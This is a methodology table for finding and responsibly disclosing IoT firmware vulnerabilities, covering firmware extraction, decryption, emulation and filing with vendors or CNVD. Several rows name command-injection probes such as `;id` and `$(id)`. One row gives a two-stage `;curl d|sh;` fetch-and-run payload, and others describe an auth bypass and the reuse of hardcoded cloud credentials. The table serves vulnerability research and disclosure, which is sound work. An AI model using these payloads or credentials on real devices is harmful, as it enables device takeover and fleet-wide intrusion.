# Breach Table — Firmware (IoT/Embedded, the CVE-Grinding Main Force)

> The master table is at `../breach-tables-cve.md` (the index); this table expands the firmware surface, same format as the master: match first, then open the "see xxx" deep dives (short pieces whole, long pieces by named section). A CVE-worthy finding = security-policy violation + exploitability proof + impact scope (the three questions are in `../disclosure-cve.md`). The firmware-surface rhythm: **extract → decrypt → unpack → search three spots (shadow/cgi/upnp) → one shot of injection or overflow → reproduce in emulation or on-device → pick the channel per vendor**.

| What to recognize | Where to hit | What counts as a hit | False leads |
| --- | --- | --- | --- |
| Any `.bin/.img/.trx/.chk` firmware where `binwalk -Me` yields squashfs | Read the magic: vendor-modified headers (TP-Link/ASUS etc.) often make `unsquashfs` report unknown magic — switch to `sasquatch`; `dd` it out and `file` it for endianness before choosing tools. The full extraction chain is in `../platforms/07-iot/iot/firmware-extraction.md` §6.1 | A complete rootfs unpacked (with etc/ usr/ www/) is the attack surface in hand; a bare kernel alone means keep paging through partitions | binwalk phantom signatures: kernel/random data misreported as squashfs — a hollow directory with no filesystem inside doesn't count |
| binwalk identifies lzma/erofs/ubi/cramfs but won't extract | For lzma try `xz --format=lzma -d` by hand; for ubi/ubifs switch to `ubireader_extract_files`; erofs needs a recent erofs-utils (old binwalk doesn't know it); cramfs has two endianness-specific tools — extracting the wrong endianness garbles without erroring | After switching tools, a browsable directory comes out | Treating a garbled directory as success; the magic matches but a custom header layer sits in between (hexdump the first bytes and compare against the standard format) |
| `binwalk -E` shows whole-image entropy >7.5 with only bare data blocks | Draw the entropy map to distinguish: uniformly high entropy = encrypted; localized high entropy + readable regions = normal compression. Once judged encrypted, take three routes (starting points in `../platforms/07-iot/iot/firmware-decryption.md` §2) | Encryption confirmed + the encrypted region's start/end offsets located | The high-entropy segment is a compressed kernel image (normal); dying on decryption without finding the key source — better to switch to the hardware route |
| The three moves for encrypted-firmware keys | ① Diff against an old transitional unencrypted version (download same-model older firmware; versions before the encrypted segment appeared contain the decryptor — the D-Link walkthrough is in `../platforms/07-iot/iot/firmware-decryption.md` §3); ② strings the bootloader partition for an AES key + try openssl; ③ UART/SPI wiring and a dump, see `../platforms/07-iot/wireless-hw/hw-interfaces.md` §2/§3 | Any one route yields a plaintext rootfs | The transitional version is also encrypted (hunt further back for the first generation); the bootloader key string serves another purpose (cross-validate: the first 16 decrypted bytes must match) |
| binwalk yields only the kernel, no rootfs | `binwalk -vv` for the full signature table; `strings <image> \| grep -i "rootfs\|mtd"` for partition names; the U-Boot environment (`fw_printenv` layout) holds the partition table — `dd` out slices by offset. Layout patterns in `../platforms/07-iot/iot/firmware-extraction.md` §1/§2 | Manually slice out the rootfs image and re-run binwalk on it | Mistaking the kernel's initramfs for the full rootfs (initramfs is early userland; the web surface often lives in another partition) |
| The vendor SDK ships kernel.bin and rootfs.bin separately | Run binwalk on rootfs.bin directly; the web/services all live in rootfs — the kernel only serves to identify driver surfaces and versions | rootfs unpacks a www/cgi-bin directory tree | Attacking after only analyzing the kernel's initramfs (the web binaries aren't there at all) |
| First thing after unpacking: search the three mandatory spots | `cat etc/shadow` (does root have a hash), `grep -rn "telnet\|backdoor" etc/ bin/ --include="*"`, `strings -n 8` the whole image for default credentials. The three-spot checklist is in `../platforms/07-iot/iot/firmware-extraction.md` §6.2 | A hardcoded root password hash (john-able) / a telnet always-on backdoor account / a debug account | shadow holds `x` (the real password is elsewhere or via pam); the backdoor account allows console login only (a physical surface — state clearly if unreachable over the network) |
| The web directory contains goahead | Walk every C program under `www/cgi-bin/`: trace `websGetVar`/`cgiMain` parameter reads to `system/popen/execve`; don't forget the handler registration surface (non-cgi-bin paths registered via `websUrlHandlerDefine`). The matrix is in `../platforms/07-iot/iot/router-practice.md` §1 | A parameter reaching a sink unfiltered (the filter blocks semicolons but not `%0a`/`$()`/backticks) | The parameter only feeds logs/_nvram; the filter function hides in a library (grep libgoahead's wrappers) |
| The web directory contains boa / lighttpd / mini_httpd | boa: lua/cgi mix — chase parameters in formDefine-registered lua handlers too; lighttpd: `grep -n "mod_auth\|auth.require" conf` for which paths have auth commented out, and map `cgi.assign` extensions to binaries; mini_httpd: bare cgi-bin all C — walk each main→argv | Any cgi parameter unauthenticated and reaching a sink | Auth is on in conf but the cgi itself never checks the session (or the reverse: the cgi checks the session, and the unauthenticated surface is in another handler) |
| Diagnostic interfaces (ping/ntp/traceroute) | Field names like `ping_ipaddr`/`ntp_server`/`host`/`dst`; fire the four sets `;id`, `%0a id`, `` `id` ``, `$(id)`; the criteria = echoed output or out-of-band DNS (resolver records on a controlled domain). The number-one command-injection hotspot is in `../platforms/07-iot/iot/router-practice.md` §1 | An unauthenticated or low-privilege command injection (with echo/out-of-band evidence) | The parameter lands in a safe slot like `ping`'s `-I`; what's echoed is the escaped command itself (check whether the output format is shell output) |
| The firmware has an upnp directory or ports 49152-49154 | `grep -rn "AddPortMapping\|NewInternalPort\|NewExternalPort" upnp/` — SOAP action fields concatenated into commands (the HG532 pattern); walk the whole service list in upnp's XML description files. The full chain is in `../platforms/07-iot/iot/router-practice.md` §5 | An unauthenticated SOAP request yielding direct command injection / a upnp stack overflow | UPnP binds the LAN interface only (LAN-side reportable but downgraded); SOAP parameters pass schema type validation (try protocol-legal malformed values) |
| Port 1883 (mqtt) | After an anonymous connect: subscribe `#` to map all topics, send malformed payloads to cmd/set-style topics and watch the device parse; an unauthenticated broker is itself a finding. Protocol surface in `../platforms/07-iot/iot/protocols-services.md` §1 | An unauthenticated control-topic (config changes/reboots/unlock-class commands) | The topics are read-only, never executed; the broker requires TLS certificates (check 8883 first) |
| 5683/udp (coap) | `GET coap://ip/.well-known/core` to enumerate the resource tree; hit PUT/POST resources unauthenticated; try the config/update-class resource names one by one. See `../platforms/07-iot/iot/protocols-services.md` §2 | Unauthenticated resource writes (provisioning/command dispatch) | Resources bind the loopback interface only; CoAP over DTLS (5684) — clear the handshake first |
| Cloud-connected firmware (strings shows api.<domain>/iot-<domain>) | `strings -n 12 \| grep -iE "api\.|token\|access.{0,3}key\|secret"` to lift hardcoded cloud credentials; AK classes by length signature (Alibaba 16/30 chars); with them, try cloud APIs for device lists/batch dispatch | Hardcoded credentials that operate the vendor's device cloud (impact = the vendor's whole fleet) | The credential is per-device and read-only for itself; the token already expired (re-verify with newer firmware) |
| The firmware has update/upgrade logic (upgrade/update files) | Chase signature verification: `grep -rn "verify\|rsa\|ecdsa\|signature"` inside the updater; md5/sha256-only = unsigned — the OTA flow is MITM-able; capture the OTA request and check whether the URL is http | A tampered firmware package the device accepts and flashes = RCE | The bootloader re-verifies at boot (flashes but won't boot); OTA is https with strict cert checks (try downgrading to http) |
| The new version fixed a bug but the update mechanism doesn't block old versions | Flash the old firmware with a known CVE back through the normal update flow (check for a minimum-version gate on the upgrade request); successful reflash + the old bug reproducing = missing downgrade protection | Missing downgrade protection is independently reportable (often chained with a known CVE) | The server validates versions and refuses delivery; signature checks block the old package (then the signature must fall first) |
| Device in hand / a dev board: wire UART first | The four-wire hookup is in `../platforms/07-iot/wireless-hw/hw-interfaces.md` §2; with a shell check: is a password needed, is it root, which services run as root in `ps` | An unauthenticated root shell (UART or telnet); a root-run web service underpins network bugs' impact | UART is passworded/glue-locked (a physical surface alone is low-value — write it up as a chain precondition); the shell is a restricted busybox (hunt escapable commands) |
| Hidden routes in the JS/frontend | Comb the web directory's js: `grep -rn "hidden\|debug\|engineering\|factory" www/`; hidden pages often mount diag/syscmd/restore-class interfaces whose parameters pass straight to a shell | A hidden-page interface with unauthenticated command injection | The page is UI-hidden but the backend has independent auth; a leftover route whose handler was deleted (404) |
| Binary network services (non-http ports) | In IDA/Ghidra find the proprietary-protocol parse functions behind `bind`/`recvfrom`; go straight at `strcpy/sprintf/vsprintf/memcpy` into stack buffers; MIPS/ARM stack layouts in `../platforms/07-iot/iot/router-practice.md` §2 | A remote stack overflow with pc (ra/lr) control | The service binds 127.0.0.1 only; a length-field check precedes parsing (check whether the comparison is `<` or `<=`) |
| Firmware components carry versions (busybox/openssl/lighttpd) | `strings busybox \| grep "BusyBox v"` etc. to get versions and match known-CVE lists; old busybox netcat/telnetd/dnsmasq often carry directly usable historical bugs | A component's known CVE reproducing on that vendor's firmware = report to the vendor (slow fixes + exposed install base); only bugs introduced in newer component versions are new IDs | The component is old but the bug's trigger conditions don't hold (the feature wasn't compiled into busybox: `--list` shows which applets were built) |
| Same-platform OEM, multiple models | Download 2-3 same-platform models' firmware and `diff -r` the two rootfs trees; an identical shared component (web core/upnp stack/minig) = one bug hits every model; the same applies to NAS/cameras/powerline adapters | One bug filed against multiple models (list all models in the impact section) | The models each modified the shared component (confirm with function-level diff); different hardware platforms share a UI skin but not the binaries |
| Vendor-EOL models | Report anyway (mark EOL + the in-field device count in the report); overseas PSIRTs answering "no longer supported" → switch to CNVD/certificate channels; domestic goes straight to CNVD intake | EOL models still get IDs (common on the CNVD side) | Zombie brands with no claimant (check the parent company/agent/acquirer before picking the recipient); don't skip the vendor and publish directly because of EOL (embargo rules unchanged) |
| The report must state impact | Use firmware signature strings (http.title/banner/specific page strings) to search device counts on mapping platforms; put the numbers in the report to lift the rating; the device-search surface is in `../platforms/07-iot/iot/attack-surface-recon.md` | Impact backed by device counts (faster rating/intake) | Signature strings too broad (matching other vendors); writing "large numbers of devices" without numbers |
| Before claiming the breach, reproduce: try emulation first | One-shot FirmAE (see `../platforms/07-iot/iot/firmware-emulation.md` §2, revival tricks §2.1); if the whole unit won't boot, degrade to QEMU user mode running a single binary (§3) or attack a remote real device. **Report whether or not it boots**: CVEs want reproducibility, not emulation success | Either emulation or a real device reproduces stably + screenshots/screen recording | An emulated breach ≠ a real-device breach (NVRAM/peripheral differences); verify once on real hardware before sending when possible |
| Submission channel selection | Overseas vendors via PSIRT/security mailbox; Xiaomi/Huawei/TP-Link run their own SRCs; domestic general route is CNVD; channel choice and templates in `../disclosure-cve.md` §1/§4 | The ID arrives (CNVD's device-class cycle is often faster than MITRE) | Multi-head filing the same bug collides (one primary; declare duplicates); a PoC carrying unmasked real device IPs gets returned |
| binwalk won't extract a filesystem (RTOS/MCU firmware) | strings for RTOS signatures (FreeRTOS `pxCurrentTCB`/ThreadX-specific error strings); for symbol-stripped images recover via the function table (see `../platforms/07-iot/iot/firmware-extraction.md` §6.3); go mainly at the network stack and proprietary protocol parsing | An RTOS network-surface overflow (often no MMU — one shot is control) | Reading data-section strings as function names; mis-computed base offsets (cross-locate with known strings) |
| Config backup/restore chain (download config → decrypt → modify → re-encrypt and upload) | When the crypto reverses but can't be re-created, **hang the vendor's own .so from the original squashfs under QEMU-user as a crypto oracle** (write a C stub calling the vendor's native crypto directly; Python conducts remotely to produce valid ciphertext); the injection point sits in the **secondary consumption** of the on-disk config (port-trigger/boot-time iptables/uci command assembly) — write point and execution point are separated | Stored config injection (waits for a trigger event; write the trigger steps clearly in the report) | A file re-created by re-implementing the reversed logic is rejected by the device (it bypassed the vendor functions); a PoC judged failed before waiting for the trigger event |
| Same-model multi-version patch-diff back-derivation | Take 3-7 builds of the same binary: ① statically enumerate dangerous call sites (read/system xrefs; watch the `size - received` pattern only) ② compare in which builds the fix guards/assertions appear/vanish ③ draw the affected-version map (goes straight into the report's impact section) | The guard-absent interval is fully triggerable + a version map | The guard was introduced by an unrelated change (cross-check the timeline); backports mean victims exist beyond the "official version table" (let field tests decide) |
| Proprietary binary-protocol auth segments (UDP 1040/20002 class) | Set the header length field to 0: the logic short-circuits past the decrypt segment, hence past auth (the TDDP pktLength=0 pattern, a C-level `&&` short-circuit — a pure static-audit product); protocols using CRC32 as integrity are directly forgeable; try the opcode table's factory reset/reboot/SYNC_FIRMWARE one by one | A plaintext segment treated as an authenticated command (reset/flash-class operations) | Zero length explicitly rejected; commands read-only with no side effects; the mesh group key must be lifted separately (a hardcoded RSA private key in the group-info partition class) |
| Network-side supply parameters (DHCP Option 66/150, router-advertisement RDNSS) | `strings libcmm/<network lib> \| grep -i "tftp\|curl"` to find the concatenation point; **you can attack without controlling the DHCP server**: forge RELEASE to clear leases → race to answer OFFER/ACK; for field truncation (16/63 bytes) use the two-stager `;curl d\|sh;` | Same-subnet, zero-interaction command injection | The field is display-only, never reaches a command; needing DHCP-server control first (write the whole chain) |
| Cloud-management dual path (strings shows tplinkcloud-class domains) | Mine each half and stitch: the local path LFD (`/%2e%2e%2f` encoded) reads configs; the cloud path (app-server, needs only a guest-level cloud token) writes arbitrary config paths out of scope; then trigger a set_region_code-class handler that pushes dev_name into popen | A cloud-token unauthorized write + local trigger-execution full chain | The cloud token is read-only per device; the cloud interface has an independent auth layer |
